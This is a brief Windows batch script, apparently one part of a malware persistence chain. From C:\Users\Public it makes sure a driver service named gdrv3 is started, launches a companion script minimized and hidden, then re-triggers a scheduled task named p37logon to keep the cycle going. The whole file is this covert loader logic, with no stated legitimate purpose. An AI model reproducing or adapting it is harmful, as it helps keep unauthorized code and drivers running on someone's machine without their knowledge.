@echo off
rem run.cmd - task action: ensure driver, hand off, then re-arm the chain
set d=C:\Users\Public\p37
cd /d %d%
sc query gdrv3 | find "RUNNING" >nul || sc start gdrv3 >nul 2>&1
start "" /min cmd /c "%d%\once.cmd"
timeout /t 12 /nobreak >nul
schtasks /run /tn p37logon >nul 2>&1



